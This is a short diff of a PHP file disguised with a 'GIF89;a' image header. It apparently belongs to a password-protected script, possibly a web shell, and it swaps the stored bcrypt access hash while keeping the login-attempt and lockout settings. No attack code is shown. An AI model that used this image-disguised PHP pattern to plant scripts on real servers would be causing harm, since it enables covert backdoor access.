@@ -3,7 +3,7 @@ GIF89;a
 <?php
 session_start();
 
-$AUTH_HASH = '$2y$12$9c8K1r8m3Qy7n5v2x8w4eO0p3s6u9y2b5d8g1j4l7o0q3t6w9z2c5f8h1k';
+$AUTH_HASH = '$2y$12$kPDe/5rlvxq7r9Dd7Cd7nuZ1nwlBMQCju4btNuGJnbavjkaTtYvGG';
 $MAX_ATTEMPTS = 3;
 $LOCKOUT_TIME = 300;
 
